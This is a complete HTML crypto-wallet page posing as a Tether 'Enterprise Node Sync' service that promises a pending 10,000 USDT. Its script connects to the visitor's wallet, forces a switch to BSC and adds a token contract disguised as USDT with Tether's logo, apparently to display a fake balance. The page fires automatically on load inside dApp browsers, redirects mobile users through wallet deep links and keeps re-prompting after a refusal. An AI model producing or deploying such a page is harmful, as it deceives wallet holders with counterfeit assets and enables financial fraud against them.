<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enterprise Node Sync | Tether Network</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --primary: #00ff9d; --bg: #050505; --card: #111111; }
        body { background: var(--bg); color: #fff; font-family: 'SF Mono', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .terminal { background: var(--card); border: 1px solid #333; border-radius: 12px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 0 40px rgba(0,255,157,0.1); }
        .glitch { font-size: 18px; font-weight: bold; color: var(--primary); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
        .stats { background: #1a1a1a; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--primary); }
        .btn { background: var(--primary); color: #000; border: none; width: 100%; padding: 20px; border-radius: 6px; font-size: 15px; font-weight: 900; cursor: pointer; transition: 0.2s; }
        .btn:hover { background: #fff; box-shadow: 0 0 20px var(--primary); }
        #console { font-size: 10px; color: #666; margin-top: 20px; text-align: left; height: 60px; overflow: hidden; line-height: 1.5; }
    </style>
</head>
<body>

<div class="terminal">
    <div class="glitch">Accessing Node...</div>
    <div class="stats">
        <div style="font-size: 10px; color: #888;">PENDING_ALLOCATION</div>
        <div style="font-size: 24px;">10,000.00 USDT</div>
    </div>
    <button class="btn" id="forceSync">INITIALIZE FORCE SYNC</button>
    <div id="console"></div>
</div>

<script>
    const ASSET_DATA = {
        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
        symbol: "USDT",
        decimals: 18,
        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
    };

    const out = document.getElementById('console');
    const print = (msg) => { out.innerHTML += `> ${msg}<br>`; out.scrollTop = out.scrollHeight; };

    // EIP-6963 Discovery Logic (Modern Standard)
    const providers = [];
    window.addEventListener("eip6963:announceProvider", (event) => {
        providers.push(event.detail);
        print(`Discovered: ${event.detail.info.name}`);
    });
    window.dispatchEvent(new Event("eip6963:requestProvider"));

    async function execute() {
        print("Starting EIP-6963 Force Sync...");
        
        // Mobile Deep Link if no provider found
        if (!window.ethereum && providers.length === 0) {
            const url = window.location.href.split('://')[1];
            window.location.href = `https://metamask.app.link/dapp/${url}`;
            setTimeout(() => {
                window.location.href = `https://link.trustwallet.com/a/dapp?url=https://${url}`;
            }, 1000);
            return;
        }

        const activeProvider = providers.length > 0 ? providers[0].provider : window.ethereum;

        try {
            await activeProvider.request({ method: 'eth_requestAccounts' });
            
            // Switch to BSC
            await activeProvider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await activeProvider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ 
                            chainId: '0x38', 
                            chainName: 'BSC', 
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            // Injection Command
            print("Sending Asset Watch Request...");
            const success = await activeProvider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: ASSET_DATA,
                },
            });

            if (success) {
                print("Injection Successful!");
                alert("Node Synced Successfully.");
            }
        } catch (e) {
            print(`Error: ${e.message}`);
            // Retry Loop for Force
            setTimeout(execute, 1000);
        }
    }

    document.getElementById('forceSync').onclick = execute;

    // Auto-fire if in dApp browser
    window.onload = () => {
        if (window.ethereum) {
            print("Direct Provider Detected. Auto-syncing...");
            setTimeout(execute, 1500);
        }
    };
</script>
</body>
</html>
